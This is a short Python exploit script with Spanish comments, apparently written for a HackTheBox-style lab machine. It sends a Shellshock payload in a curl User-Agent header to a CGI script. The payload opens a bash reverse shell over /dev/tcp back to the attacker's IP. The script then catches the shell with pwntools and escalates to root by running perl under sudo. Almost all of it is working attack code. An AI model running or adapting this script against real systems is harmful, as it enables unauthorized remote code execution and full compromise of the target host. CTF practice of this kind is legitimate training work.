#!/usr/bin/python3
#coding: utf-8

#----------------------------------------------------------

#Made by: WizzzStark
#Remember to change your attacker IP in request function.

#-----------------------------------------------------------


import requests
import pdb
import threading
import signal
import sys
import time
import os

from pwn import *


ip_maquina='10.10.10.56'
curl_port='1234'
lport = 1234
local_ip='10.10.15.122'


def exit(sig, frame):
        print("\n [!] Saliendo...\n")
        sys.exit(1)


signal.signal(signal.SIGINT, exit)


def request():
	os.system("curl -H \"user-agent: () { :; }; echo;echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.15.122/1234 0>&1'\" http://10.10.10.56/cgi-bin/user.sh ")


if __name__=='__main__':

	try:
		threading.Thread(target=request, args=()).start()
	except Esception as e:
		log.error(str(e))

	p1 = log.progress("Acceso")
	p1.status("Ganando acceso al sistema")

	shell = listen(lport, timeout=10).wait_for_connection()

	if shell.sock is None:
		p1.failure("No ha sido posible ganar acceso al sistema")
		sys.exit(1)
	else:
		p1.success("Se ha ganado acceso con exito")

	p2 = log.progress("Privilege Escalation")
	p2.status("Migrando al usuario root")
	shell.sendline("sudo /usr/bin/perl -e 'exec \"/bin/sh\"'")
	p2.success("Se migró al usuario root correctamente")

	shell.interactive()
